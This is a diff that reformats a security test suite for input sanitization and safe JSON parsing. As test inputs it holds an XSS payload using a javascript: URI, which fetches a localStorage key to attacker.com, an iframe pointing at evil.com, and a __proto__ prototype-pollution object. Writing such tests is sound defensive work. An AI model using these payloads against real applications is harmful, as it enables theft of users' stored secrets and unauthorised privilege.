@@ -18,13 +18,15 @@ describe('Security & Input Sanitization Suite', () => {
     });
 
     it('strips javascript: protocol URI schemes', () => {
-      const malicious = 'javascript:fetch("https://attacker.com/steal?k=" + localStorage.getItem("key"))';
+      const malicious =
+        'javascript:fetch("https://attacker.com/steal?k=" + localStorage.getItem("key"))';
       const clean = sanitizeString(malicious);
       expect(clean).not.toContain('javascript:');
     });
 
     it('strips iframe, embed, and object tags', () => {
-      const malicious = '<iframe src="https://evil.com"></iframe><embed src="x"><object data="y"></object>Birthday';
+      const malicious =
+        '<iframe src="https://evil.com"></iframe><embed src="x"><object data="y"></object>Birthday';
       const clean = sanitizeString(malicious);
       expect(clean).not.toContain('<iframe');
       expect(clean).not.toContain('<embed');
@@ -64,7 +66,9 @@ describe('Security & Input Sanitization Suite', () => {
 
     it('strips prototype pollution vectors (__proto__, constructor)', () => {
       const maliciousJSON = '{"__proto__": {"admin": true}, "title": "Celebration"}';
-      const parsed = safeJSONParse<{ title: string; admin?: boolean }>(maliciousJSON, { title: '' });
+      const parsed = safeJSONParse<{ title: string; admin?: boolean }>(maliciousJSON, {
+        title: '',
+      });
       expect(parsed.title).toBe('Celebration');
       // Root object prototype must not be polluted
       expect(({} as { admin?: boolean }).admin).toBeUndefined();
